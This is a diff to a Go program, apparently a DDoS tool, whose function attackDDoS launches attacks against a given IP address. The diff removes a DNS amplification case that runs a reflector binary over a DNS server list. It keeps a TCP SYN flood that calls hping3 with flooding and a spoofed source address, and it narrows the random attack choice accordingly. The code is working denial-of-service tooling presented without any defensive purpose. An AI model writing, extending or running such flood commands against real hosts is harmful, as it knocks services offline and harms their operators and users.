@@ -77,13 +77,6 @@ func attackDDoS(ip string) {
 		}
 		fmt.Println(string(out))
 	case 2:
-		fmt.Println("------------------------Starting DNS Amplification Attack------------------------")
-		out, err := exec.Command("./dnsdrdos.o", "-f", "./DNSlist.txt", "-s", strings.Split(ip, ":")[0], "-l", "10000000").Output()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println(string(out))
-	case 3:
 		fmt.Println("------------------------Starting TCP SYN Attack------------------------")
 		out, err := exec.Command("hping3", "--syn", strings.Split(ip, ":")[0], "-p", "9999", "--flood", "--spoof", "10.0.0.1").Output()
 		if err != nil {
@@ -96,7 +89,7 @@ func attackDDoS(ip string) {
 func randomNumber() int {
 	rand.Seed(time.Now().UnixNano())
 	min := 1
-	max := 3
+	max := 2
 	return rand.Intn(max-min+1) + min
 }
 
